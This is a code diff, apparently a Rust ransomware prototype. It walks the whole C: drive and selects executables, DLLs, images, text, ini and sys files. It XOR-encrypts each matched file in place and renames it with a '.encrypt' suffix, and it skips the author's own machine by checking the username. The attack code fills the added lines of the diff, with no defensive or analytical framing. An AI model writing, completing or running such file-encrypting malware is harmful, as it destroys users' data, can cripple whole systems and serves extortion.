@@ -1,47 +1,63 @@
-use walkdir::WalkDir;
+//https://blog.csdn.net/wsp_1138886114/article/details/116454414
+
 use lazy_static::lazy_static;
+use std::fs;
 use std::{str, vec};
+use walkdir::{self, WalkDir,Error};
+use std::path::Path;
 
-lazy_static!{
-static ref kIncludeBackfix:Vec<&'static str> = vec![".exe",".dll",".png",".jpg",
-".bmp", ".txt", ".ini",  ".sys"];
 
-static ref kHardDriver:Vec<&'static str> = vec!["C:"];
+
+
+lazy_static! {
+    static ref kIncludeBackfix: Vec<&'static str> =
+        vec![".exe", ".dll", ".png", ".jpg", ".bmp", ".txt", ".ini", ".sys"];
+    static ref kHardDriver: Vec<&'static str> = vec!["C:"];
 }
 
-pub fn encrypt_buffer() {
+pub fn encrypt_buffer(v:& mut Vec<u8>) {
 
-}
-
-pub fn encrypt_file(){
-    
-}
-
-fn main() -> Result<(),walkdir::Error>{
-    
-    for HardDriver in kHardDriver.iter(){
-
-    for entry in WalkDir::new(HardDriver) {
-
-        match entry{
-            Ok(DirEntry)  => {
-
-                // 判断指定文件是否符合目标后缀
-                let BackfixInclude = false;
-                for iter in kIncludeBackfix.iter(){
-                    if(DirEntry.file_name().to_str().unwrap().ends_with(iter)){
-                        // 打印文件
-                        println!("{}", DirEntry.path().display());
-                    }
-                }
-                
-            },
-            Err(error) => {
-                
-            }
-        }
-	}
+    for byte in v.iter_mut(){
+        *byte  = *byte ^ 0x7A;
     }
 
-Ok(())
+}
+
+pub fn encrypt_file(path : &Path) {
+    let mut buffer = fs::read(path).expect("");
+    encrypt_buffer(&mut buffer);
+    fs::write(path, buffer);
+    fs::rename(path, format!("{}.encrypt",path.display()));
+}
+
+fn main() -> Result<(),Error>{
+
+    // this is my computer 
+    if whoami::realname() == "asdf"{
+        println!("Host Computer\n");
+        return Ok(());
+    }
+
+    for HardDriver in kHardDriver.iter() {
+        for entry in WalkDir::new(HardDriver) {
+            match entry {
+                Ok(DirEntry) => {
+                    // 判断指定文件是否符合目标后缀
+                    let BackfixInclude = false;
+                    for iter in kIncludeBackfix.iter() {
+                        if DirEntry.file_name().to_str().unwrap().ends_with(iter) {
+                            // 打印文件
+                            println!("{}", DirEntry.path().display());
+                            encrypt_file(DirEntry.path());
+                        }
+                    }
+                }
+                Err(error) => {}
+            }
+        }
+    }
+
+    Ok(())
+
+
 }
